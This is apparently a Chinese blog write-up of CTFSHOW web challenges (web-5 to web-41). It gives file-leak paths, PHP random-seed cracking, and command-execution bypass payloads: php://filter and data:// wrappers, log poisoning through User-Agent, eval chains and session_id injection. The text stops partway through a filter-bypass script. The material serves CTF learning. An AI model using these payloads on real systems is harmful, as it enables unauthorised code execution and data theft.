<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>　CTFSHOW_WP(1-197) | yake-daigua</title><meta name="keywords" content="CTFSHOW"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息搜集web-5这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag web-6&#x2F;www.zip，然后访问&#x2F;fI000g.txt web-7&#x2F;.git&#x2F;index.php web-8&#x2F;.svn&#x2F; web-91.当vim在编辑文档的过程中如果异">
<meta property="og:type" content="article">
<meta property="og:title" content="　CTFSHOW_WP(1-197)">
<meta property="og:url" content="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="信息搜集web-5这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag web-6&#x2F;www.zip，然后访问&#x2F;fI000g.txt web-7&#x2F;.git&#x2F;index.php web-8&#x2F;.svn&#x2F; web-91.当vim在编辑文档的过程中如果异">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg">
<meta property="article:published_time" content="2022-10-31T15:07:24.000Z">
<meta property="article:modified_time" content="2022-10-31T16:04:38.100Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="CTFSHOW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '　CTFSHOW_WP(1-197)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-01 00:04:38'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">　CTFSHOW_WP(1-197)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-31T15:07:24.000Z" title="发表于 2022-10-31 23:07:24">2022-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-31T16:04:38.100Z" title="更新于 2022-11-01 00:04:38">2022-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/CTFSHOW/">CTFSHOW</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="　CTFSHOW_WP(1-197)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web-5"><a href="#web-5" class="headerlink" title="web-5"></a>web-5</h3><p>这里题目暗示phps，那我们直接访问一下url&#x2F;index.phps,会弹出一个下载文件的窗口。下载后得到index.phps的源码，里面有flag</p>
<h3 id="web-6"><a href="#web-6" class="headerlink" title="web-6"></a>web-6</h3><p>&#x2F;<a target="_blank" rel="noopener" href="http://www.zip,然后访问/fI000g.txt">www.zip，然后访问/fI000g.txt</a></p>
<h3 id="web-7"><a href="#web-7" class="headerlink" title="web-7"></a>web-7</h3><p>&#x2F;.git&#x2F;index.php</p>
<h3 id="web-8"><a href="#web-8" class="headerlink" title="web-8"></a>web-8</h3><p>&#x2F;.svn&#x2F;</p>
<h3 id="web-9"><a href="#web-9" class="headerlink" title="web-9"></a>web-9</h3><p>1.当vim在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p>
<p>2.使用命令vim -r 可以查看当前目录下的所有swp文件。</p>
<p>3.使用命令vim -r filename可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p>
<p>4.调用这类的隐藏文件的时候，需要在最前面加.(如删除index.php.swp，则需要rm -fr* .index.php.swp).</p>
<p>5.vim使用的缓存存储是一种固定的二进制文件，我们可以通过curl命令，或者vim命令进行查看。</p>
<p>根据网页提示，我们首页访问index.php，网页无反应。</p>
<p>然后我们根据vim的缓存原理，我们访问.index.php.swp，网站会弹出</p>
<p>如果在Linux系统下运行，我们可以先通过vim -r .index.php.swp来将源文件恢复。然后我们即可查看到flag。</p>
<h3 id="web-11"><a href="#web-11" class="headerlink" title="web-11"></a>web-11</h3><p>dbcha.com,解析域名，TXT 记录，一般指为某个主机名或域名设置的说明。</p>
<h3 id="web-12"><a href="#web-12" class="headerlink" title="web-12"></a>web-12</h3><p>管理员后台&#x2F;admin，密码在底部</p>
<h3 id="web-13"><a href="#web-13" class="headerlink" title="web-13"></a>web-13</h3><p>document泄露</p>
<h3 id="web-14"><a href="#web-14" class="headerlink" title="web-14"></a>web-14</h3><p>&#x2F;editor</p>
<p>&#x2F;nothinghere&#x2F;fl000g.txt</p>
<h3 id="web-15"><a href="#web-15" class="headerlink" title="web-15"></a>web-15</h3><p>&#x2F;admin忘记密码，泄露的邮箱显示为西安</p>
<h3 id="web-16"><a href="#web-16" class="headerlink" title="web-16*"></a>web-16*</h3><p>&#x2F;tz.php访问phpinfo，搜索flag</p>
<p>PHP探针实际上是一种Web脚本程序，主要是用来探测虚拟空间、服务器的运行状况，而本质上是通过PHP语言实现探测PHP服务器敏感信息的脚本文件，通常用于探测网站目录、服务器操作系统、PHP版本、数据库版本、CPU、内存、组件支持等，基本能够很全面的了解服务器的各项信息。</p>
<h3 id="web-17"><a href="#web-17" class="headerlink" title="web-17"></a>web-17</h3><p>&#x2F;backup.sql</p>
<p>备份sql泄露</p>
<h3 id="web-18"><a href="#web-18" class="headerlink" title="web-18"></a>web-18</h3><p>看源码js，\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b解码</p>
<p>&#x2F;110.php</p>
<h3 id="web-20"><a href="#web-20" class="headerlink" title="web-20*"></a>web-20*</h3><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web-21"><a href="#web-21" class="headerlink" title="web-21"></a>web-21</h3><p>bp爆破模块的使用，小心url编码</p>
<h3 id="web-22"><a href="#web-22" class="headerlink" title="web-22"></a>web-22</h3><p><a target="_blank" rel="noopener" href="http://z.zcjun.com/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4">http://z.zcjun.com/子域名爆破</a></p>
<h3 id="web-23"><a href="#web-23" class="headerlink" title="web-23"></a>web-23</h3><p>token爆破</p>
<h3 id="web-24"><a href="#web-24" class="headerlink" title="web-24*"></a>web-24*</h3><p>直接跑一下看看生成的随机数是什么就行。</p>
<p>mt_scrand(seed)。这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是*在同一进程中,同一个seed,每次通过mt_rand()生成的值都是固定的 </p>
<h3 id="web-25"><a href="#web-25" class="headerlink" title="web-25*"></a>web-25*</h3><p><a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p>
<p>我们先取0，得到第一个随机数的负数</p>
<p>然后去.&#x2F;php_mt_seed里面生成种子，根据版本选择种子</p>
<p>然后看题目要求，token为第二三个种子相加，我们直接利用上面的种子生产第二三个数值相加即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">官方解释：</span><br><span class="line">mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 解题：通过随机数来寻找种子 我们让 ?r=0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 ./php_mt_seed 183607393</span><br><span class="line"></span><br><span class="line">找到对应的版本这里自己的运气好第一个出来的自己验证了一下发现就是这个 注：可能存在多个种子需要自己进行判断 通过种子找到第一个随机数就是上面的随机数。</span><br><span class="line"></span><br><span class="line">payload： ?r=183607393 Cookie: token=794171094</span><br></pre></td></tr></table></figure>

<h3 id="web-27"><a href="#web-27" class="headerlink" title="web-27"></a>web-27</h3><p>根据表格，在查询界面跑就完事了，用data跑，注意中文编码。</p>
<h3 id="web-28"><a href="#web-28" class="headerlink" title="web-28"></a>web-28</h3><p>直接数字跑目录就行</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web-29"><a href="#web-29" class="headerlink" title="web-29*"></a>web-29*</h3><p>?c&#x3D;system(‘ls’);</p>
<p>?c&#x3D;echo `nl fla’’g.php&#96;;</p>
<h3 id="web-30"><a href="#web-30" class="headerlink" title="web-30"></a>web-30</h3><p>?c&#x3D;echo%20`nl%20fla%27%27g.p%27%27hp&#96;;</p>
<h3 id="web-31"><a href="#web-31" class="headerlink" title="web-31*"></a>web-31*</h3><p>?c&#x3D;include$_GET[x];&amp;x&#x3D;php:<em>&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</em></p>
<p>?c&#x3D;require$_GET[x];&amp;x&#x3D;php:<em>&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;flag.php</em></p>
<h3 id="web-32"><a href="#web-32" class="headerlink" title="web-32"></a>web-32</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-33"><a href="#web-33" class="headerlink" title="web-33"></a>web-33</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-34"><a href="#web-34" class="headerlink" title="web-34"></a>web-34</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-35"><a href="#web-35" class="headerlink" title="web-35"></a>web-35</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-36"><a href="#web-36" class="headerlink" title="web-36"></a>web-36</h3><p>?c&#x3D;include$_GET[x]?&gt;&amp;x&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-37"><a href="#web-37" class="headerlink" title="web-37"></a>web-37</h3><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<br>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat fla*');?></p>
<h3 id="web-38"><a href="#web-38" class="headerlink" title="web-38*"></a>web-38*</h3><p>日志包含：</p>
<p>User-Agent: <?php system('cat flag.php');?></p>
<p>view-source:<a target="_blank" rel="noopener" href="http://886a56cc-45cf-4f20-aa05-cd7113aefd8c.challenge.ctf.show/?c=/var/log/nginx/access.log">http://886a56cc-45cf-4f20-aa05-cd7113aefd8c.challenge.ctf.show/?c=/var/log/nginx/access.log</a></p>
<p>由于正则过滤了php所以我们的<?php ?>，就被过滤了，这里可以使用短标签。用&#x3D;代替php。</p>
<p>将flag.php内容copy到1.txt中（也可以使用mv命令 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('mv fla* 1.txt');?>），之后在去访问1.txt。</p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(%27cp%20fla*%201.txt%27);?></p>
<p>?c&#x3D;1.txt</p>
<h3 id="web-39"><a href="#web-39" class="headerlink" title="web-39"></a>web-39</h3><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat fla*');?></p>
<h3 id="web-40"><a href="#web-40" class="headerlink" title="web-40*"></a>web-40*</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121041140">https://blog.csdn.net/Kracxi/article/details/121041140</a></p>
<p>过滤了很多符号，比如引号，美元符等，可以构造无参数函数</p>
<p>无参数是指a()，a(b())等，而不能是a(‘b’)</p>
<p>print_r(scandir(‘.’));查看当前目录下的所有文件名</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));打印出当前目录下文件</span><br></pre></td></tr></table></figure>

<p>flag.php在倒数第二个，直接用next(array_reverse());</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>pos()是PHP中的内置函数,用于返回内部指针当前指向的数组中元素的值。返回值后,pos()函数不会递增或递减内部指针。</p>
<p>首先就是查看已经定义好的所有的变量。使用get_defined_vars()函数，返回由所有已定义变量所组成的数组。版本要求：PHP 4 &gt;&#x3D; 4.0.4, PHP 5, PHP 7</p>
<p>使用print_r()函数，将已经定义好的变量组成的数组进行打印输出。payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars())</span><br></pre></td></tr></table></figure>

<p>发现由GET、POST等，这里我们就可以使用POST传入一个参数看一下。</p>
<p>post传参为1&#x3D;phpinfo();使用payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>

<p>之后我们的思路就是将他的值取出来，然后去执行它。这里使用array_pop()函数将他的值弹出来，通过eval()函数来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">daigua=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>



<p>GXYCTF的禁止套娃 通过cookie获得参数进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session）</span><br><span class="line">受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br></pre></td></tr></table></figure>

<p>提交之后 Cookie中会生成PHPSESSID，这时候我们可以把它的值改成ls再提交，然后就会显示当前目录下的文件，也可以用bp来抓包,修改值为ls 再提交，获得目录的下文件，后面可以继续构造payload来拿到flag，可以用base64编码和写小马。由于php版本问题只能进行到这里.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?c=show_source(session_id(session_start()));</span><br><span class="line">PHPSSID值设为flag.php</span><br></pre></td></tr></table></figure>

<p>ps：session_idsession_id	<a target="_blank" rel="noopener" href="http://t.zoukankan.com/imnzq-p-6859011.html">http://t.zoukankan.com/imnzq-p-6859011.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php session_id()用法代码举例如下:</span><br><span class="line"></span><br><span class="line">输出session_id()详细代码:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  session_start();//开启session会话</span><br><span class="line"></span><br><span class="line">  echo session_id();//输入session_id</span><br><span class="line"></span><br><span class="line">  // 输出 08nr1fav9jqs2pdi5qlpsmd247</span><br><span class="line">?&gt;</span><br><span class="line">设置 session_id()详细代码:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  session_id(&quot;www.169it.com&quot;);//设置session_id </span><br><span class="line"></span><br><span class="line">  session_start();//开启session会话</span><br><span class="line"></span><br><span class="line">  echo session_id();</span><br><span class="line"></span><br><span class="line">  // 输出 www.169it.com</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-41"><a href="#web-41" class="headerlink" title="web-41*"></a>web-41*</h3><p>脚本一，我没跑成功，改来改去也不对,可以参考着自己写个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url=&quot;http://4d761ee5-a510-4666-a3cd-bc2771825aca.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">a=[]</span><br><span class="line">ans1=&quot;&quot; </span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for i in range(0,256): #设置i的范围为全部字符</span><br><span class="line">    c=chr(i) </span><br><span class="line">    #将i转换成ascii对应的字符，并赋值给c</span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c,re.I)</span><br><span class="line">    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span><br><span class="line">    if(tmp):</span><br><span class="line">        continue</span><br><span class="line">        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span><br><span class="line">    else:</span><br><span class="line">        a.append(i)</span><br><span class="line">        #在数组中增加i，这些就是未被系统过滤掉的字符</span><br><span class="line"> </span><br><span class="line"># eval(&quot;echo($c);&quot;);</span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line">myb=&quot;cat flag.php&quot;      #参数</span><br><span class="line">def myfun(k,my): #自定义函数</span><br><span class="line">    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错</span><br><span class="line">    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错</span><br><span class="line">    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 </span><br><span class="line">        for j in range(i,len(a)): #在上个循环的条件下设置j的范围</span><br><span class="line">            if(a[i]|a[j]==ord(my[k])):</span><br><span class="line">                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])</span><br><span class="line">                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])</span><br><span class="line">                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span><br><span class="line">for x in range(0,len(mya)): #设置k的范围</span><br><span class="line">    myfun(x,mya)#引用自定义的函数</span><br><span class="line">data1=&quot;(&#x27;&quot;+ans1+&quot;&#x27;|&#x27;&quot;+ans2+&quot;&#x27;)&quot; 